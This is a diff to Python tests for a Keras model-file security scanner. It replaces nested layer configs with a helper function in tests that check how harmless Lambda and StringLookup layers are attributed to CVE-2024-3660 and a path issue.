         """Stable fixed Keras 2.13 variants should stay outside CVE-2024-3660 attribution."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "my_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "my_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version=keras_version))
 
         cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2024-3660"]
@@ -8985,18 +8463,13 @@ class TestCVE20243660LambdaAttribution:
         """Unrecognized fixed-boundary qualifiers must not suppress Lambda risk with a passing check."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "my_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "my_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         keras_path = self._make_keras_zip(config, tmp_path, keras_version=keras_version)
 
         result = scanner.scan(keras_path)
@@ -9015,18 +8488,13 @@ class TestCVE20243660LambdaAttribution:
         """Lambda in Keras 2.10 (two-part version) should be CVE-attributed."""
         scanner = KerasZipScanner()
         encoded = base64.b64encode(b"lambda x: x * 2").decode()
-        config = {
-            "class_name": "Sequential",
-            "config": {
-                "layers": [
-                    {
-                        "class_name": "Lambda",
-                        "name": "my_lambda",
-                        "config": {"function": [encoded, None, None]},
-                    }
-                ]
+        config = _sequential_config(
+            {
+                "class_name": "Lambda",
+                "name": "my_lambda",
+                "config": {"function": [encoded, None, None]},
             },
-        }
+        )
         result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version="2.10"))
         cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
         assert len(cve_issues) >= 1, "Keras 2.10 should be attributed as vulnerable"
@@ -9097,18 +8565,13 @@ def _assert_queued_unsafe_config(config_name: str, config_value: bool) -> None:
 
 def _assert_relative_vocabulary_cve(tmp_path: Path, vocabulary: str) -> None:
     scanner = KerasZipScanner()
-    config = {
-        "class_name": "Sequential",
-        "config": {
-            "layers": [
-                {
-                    "class_name": "StringLookup",
-                    "name": "string_lookup",
-                    "config": {"vocabulary": vocabulary},
-                },
-            ],
+    config = _sequential_config(
+        {
+            "class_name": "StringLookup",
+            "name": "string_lookup",
+            "config": {"vocabulary": vocabulary},
         },
-    }
+    )
 
     model_path = create_configured_keras_zip(tmp_path, config, keras_version="3.11.3")
     result = scanner.scan(str(model_path))
